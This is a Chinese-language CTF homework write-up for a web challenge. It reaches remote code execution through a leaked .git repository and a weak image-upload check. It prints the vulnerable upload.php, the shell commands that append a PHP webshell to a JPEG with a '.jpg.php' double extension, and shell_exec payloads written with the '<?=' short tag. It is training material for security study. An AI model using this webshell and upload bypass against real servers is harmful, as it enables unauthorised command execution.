# HW - Imgura
###### tags: `資安` `Web`

## 題目解析
根據題目給的連結點進來可以看到一個建構中網頁，沒有什麼東西可以按，F12 source code 看起來也沒甚麼可以利用的東西。
![](https://i.imgur.com/Pi4Wrl6.png)

## 解題流程
### Information Leak
在沒什麼明顯可攻擊方向的情況下，先試試看網頁是否有 Infrmarion Leak，如果有我們應該可以收集到一些東西，因為我這時候沒安裝 DotGit，所以沒有及時發現有 .git 的 Information Leak，是後來稍微手動試了一下，才發現是有 .git Information Leak 的。

### Git Hack
確認有 .git 的 Information Leak 後用可以用 githack 工具把 /.git 整個 repository 都 hack 下來。
- https://github.com/WangYihang/GitHacker
- https://github.com/denny0223/scrabble

當然如果你有裝 Dotgit 的 chrome 插件，也是可以直接把 .git 資料夾壓縮載下來的。

載下來後進到 .git/ 目錄裡，下 git log 指令可以看到有兩次 commit ，第二次 commit 是刪除某些東西。

![](https://i.imgur.com/3J1Nikn.png)

想要看到第二次 commit 詳細做了什麼，可以下 git show (預設是最新一筆 commit 內容) 或 git log -p 指令，這裡就很明顯看到刪掉了 dev_test_page 目錄底下的一些頁面，但在 git 刪掉不代表 web server 上也刪掉了，如果網頁工程師沒有再次打包上傳，這些頁面實際上還是會存在 web server 上的。

![](https://i.imgur.com/JPdF08S.png)

### LFI

嘗試連進隱藏網址，發現有一個 upload 功能。

![](https://i.imgur.com/Zfbs7PL.png)

而看到 upload 功能，相信大家都會很直覺的想到 LFI。

![](https://i.imgur.com/Aod1lPS.png)

試著上傳一張圖片，可以看到他直接是跳轉去讀取該圖片，所以我們若能上傳一張帶有 webshell 的圖片，理論上就能透過自動跳轉讀取圖片的動作，達成 LFI。

![](https://i.imgur.com/MoiJK2t.png)

做到這一步大概就有個大方向了，可以看看這些網頁的 source code 是否有對 LFI 的一些限制。因為我們已經有了整個 git 的 repository，依照 git 的規定，git repository 所有　object 都存放在 object 目錄下，git 存放 object 的方式是由 header + content 過 SHA-1 共 40 字元，前 2 字元是子目錄，其餘是檔名。
![](https://i.imgur.com/yUKzSBS.png)

因此我們可以用 git cat-file -p 2f35 的指令來查看想看的檔案內容 (2f35 舉例)，透過這樣的方式可以查看所有頁面的 source code。
![](https://i.imgur.com/mRFa2cT.png)

也可以知道整個 dec_test_page 目錄下的架構。
![](https://i.imgur.com/9M5Yv8K.png)

![](https://i.imgur.com/QxgpF3Q.png)

sorce code 比較重要的就是 upload.php，可以看到有對檔案上傳做很多限制。
```php=
<?php
if (!file_exists($_FILES['image_file']['tmp_name']) || !is_uploaded_file($_FILES['image_file']['tmp_name'])) {
    die('Gimme file!');
}

$filename = basename($_FILES['image_file']['name']);
$extension = strtolower(explode(".", $filename)[1]);

if (!in_array($extension, ['png', 'jpeg', 'jpg']) !== false) {
    die("Invalid file extension: $extension.");
}

if ($_FILES['image_file']['size'] > 256000) {
    die('File size is too large.');
}

// check file type
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$type = finfo_file($finfo, $_FILES['image_file']['tmp_name']);
finfo_close($finfo);
if (!in_array($type, ['image/png', 'image/jpeg'])) {
    die('Not an valid image.');
}

// check file width/height
$size = getimagesize($_FILES['image_file']['tmp_name']);
if ($size[0] > 512 || $size[1] > 512) {
    die('Uploaded image is too large.');
}


$content = file_get_contents($_FILES['image_file']['tmp_name']);
if (stripos($content, "<?php") !== false) {
    die("Hacker?");
}

$prefix = bin2hex(random_bytes(4));
move_uploaded_file($_FILES['image_file']['tmp_name'], "images/${prefix}_${filename}");
header("Location: images/${prefix}_${filename}");
```



### 製作 webshell 圖片
為了符合 upload.php 的檔案限制，先隨便找一張圖 (這邊用 black.jpg)，接著製作 webshell，因為 upload.php 有擋<?php 的 tag，所以我先試著用了<? php section ?>，發現 server 並沒有啟用短標記，因此改用 <?=，這個是另類 php tag，<?=的意思等於 <?php echo 因此比較不一樣的是你在裡面不用 echo 他就會自動幫你把東西 echo 出來了。

webshell 的部分，我是先用phpinfo()來試能不能順利做到 LFI。
```php
<?=
	phpinfo();
```

透過指令將 webshell 寫進圖片後面，如此可以讓檔案帶著 jpg 的 MIME type，上傳才不會被 MIME type 檢查擋掉，另外在上傳前把檔名改成 b.jpg.php (.jpg.php 後輟)，躲避檔案 extension 的判斷，最後在上傳檔案是時選擇 all file 就可以看到 .jpg.php 檔案，並進行上傳。
```
cat black.jpg > b.jpg
cat webshell.txt >> b.jpg
mv b.jpg b.jpg.php
```
![](https://i.imgur.com/GuF5WfH.png)

### LFI => RCE
上傳後他自動跳轉到圖片，可以看到 server 成功執行我們塞入的 webshell，顯示了 phpinfo()。
![](https://i.imgur.com/NWvSWcI.png)

確定可以做到 LFI 後把 webshell 稍微改一下，加入 shell_exec()，塞進圖片再上傳就可以做到 RCE，稍微找一下就可以看到 FLAG 了！
```php
<?=
	$a = shell_exec("cd /; cat this_is_flaggggg");
	phpinfo();
?>
```

## FLAG 截圖
![](https://i.imgur.com/tVm2Hot.png)

